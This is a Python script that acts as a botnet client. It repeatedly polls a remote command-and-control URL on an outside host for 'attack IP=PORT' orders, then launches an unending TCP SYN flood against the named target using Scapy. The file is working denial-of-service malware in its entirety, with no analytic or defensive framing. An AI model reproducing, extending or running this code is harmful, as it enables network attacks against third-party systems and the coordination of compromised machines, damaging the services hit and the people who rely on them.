import requests
import re
from scapy.all import *
import time

# Define the target URL for getting commands
url = "http://chathere.getenjoyment.net/apk_payload/index2.php"

# Extract IP and Port from the command
def extract_ip_port(command):
    pattern = r"attack (\d+\.\d+\.\d+\.\d+)=(\d+)"
    match = re.match(pattern, command)
    if match:
        ip = match.group(1)
        port = int(match.group(2))
        return ip, port
    else:
        return None, None

# TCP SYN flood using Scapy
def syn_flood(ip, port):
    local_ip = get_if_addr(conf.iface)  # Get the local IP address of the interface
    print(f"Starting TCP SYN flood from {local_ip} to {ip}:{port}")
    total_packets = 0
    successful_attempts = 0
    failed_attempts = 0

    while True:
        try:
            # Create a SYN packet using Scapy
            packet = IP(src=local_ip, dst=ip) / TCP(dport=port, flags="S")
            
            # Send the packet
            send(packet, verbose=0)
            
            successful_attempts += 1
            print(f"{local_ip} + {total_packets + 1} packets sent + Success={successful_attempts}, Failures={failed_attempts} + Attacking {ip}:{port}")
        except Exception as e:
            failed_attempts += 1
            print(f"Failed to send packet {total_packets + 1}: {e}")
        
        total_packets += 1
        # Print the current status of the attack
        print(f"{local_ip} + {total_packets} packets sent + Success={successful_attempts}, Failures={failed_attempts} + Attacking {ip}:{port}")

# Function to listen for commands and start attacks
def listen_for_commands():
    while True:
        try:
            # Make the HTTP request without proxy (to fetch command)
            response = requests.get(url)
            
            if response.status_code == 200:
                command = response.text.strip()
                
                if command.startswith("attack"):
                    ip, port = extract_ip_port(command)
                    
                    if ip and port:
                        syn_flood(ip, port)  # Send the attack without a proxy
                    else:
                        print(f"Invalid command format: {command}")
                else:
                    print(f"Unknown command: {command}")
            else:
                print("Failed to fetch command from URL.")
            
        except requests.exceptions.RequestException as e:
            print(f"Error fetching command: {e}")
        
        # Wait for 5 seconds before checking again
        time.sleep(5)

if __name__ == "__main__":
    listen_for_commands()
